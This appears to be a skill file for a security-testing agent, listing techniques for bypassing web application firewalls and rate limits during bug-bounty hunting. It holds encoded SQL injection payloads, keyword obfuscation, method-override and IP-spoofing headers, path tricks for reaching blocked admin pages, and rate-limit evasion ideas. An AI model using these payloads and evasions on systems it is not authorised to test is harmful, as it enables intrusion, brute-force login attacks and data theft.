---
name: hunt-waf-bypass
description: WAF/rate-limit bypass techniques — when the target uses a WAF or rate limiting that blocks standard payloads, use encoding, fragmentation, and protocol-level bypasses.
triggers:
  - waf
  - rate limit
  - cloudflare
  - akamai
  - blocked
  - 403
  - 429
priority: 60
---

# hunt-waf-bypass — WAF & Rate Limit Bypass

## When to Use

When standard payloads get blocked (403, 406, or sanitized responses) or rate limiting
prevents thorough testing (429).

## WAF Bypass Techniques

### 1. Encoding Bypasses
```
# URL encoding
%27%20OR%201%3D1--

# Double URL encoding
%2527%2520OR%25201%253D1--

# Unicode encoding
' OR 1=1--

# HTML entity encoding
&#39; OR 1=1--

# Mixed encoding
%27%20O%52%201%3D1--
```

### 2. Case & Whitespace Manipulation
```sql
-- Case variation
sElEcT * fRoM users
-- Comment insertion
SEL/**/ECT * FR/**/OM users
-- Whitespace alternatives
SELECT%09*%0AFROM%0Dusers
-- Null byte insertion
SEL%00ECT * FROM users
```

### 3. HTTP Method Override
```
# Try method override headers
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
_method=PUT (in body)
```

### 4. Path Manipulation
```
# Path normalization differences
/admin → blocked
/Admin → allowed?
/admin/ → allowed?
/./admin → allowed?
/admin;.js → allowed?
/%61dmin → allowed?
/admin%00 → allowed?
```

### 5. Header-Based Bypasses
```
# IP spoofing (if WAF trusts these)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

## Rate Limit Bypass Techniques

### 1. Header Rotation
```
# Different X-Forwarded-For per request
X-Forwarded-For: 10.0.0.{1-255}
```

### 2. Endpoint Variation
```
# Same endpoint, different paths
/api/v1/login
/api/v1/login/
/api/v1/Login
/api/v1//login
/api/v1/login?x=1
/api/v1/login#
```

### 3. HTTP/2 Multiplexing
```bash
# Send multiple requests in a single TCP connection
# Rate limiters counting connections miss this
```

### 4. Race Condition Window
```bash
# Send N requests simultaneously to hit before rate limiter updates
# Use threading/async to maximize parallelism within the window
```

## Validation

- WAF bypass alone is NOT a vulnerability (informational at best)
- Must chain with an actual security impact (SQLi, XSS, auth bypass, etc.)
- Rate limit bypass must enable a meaningful attack (brute force, enumeration)
- Document the specific WAF product/version if identifiable
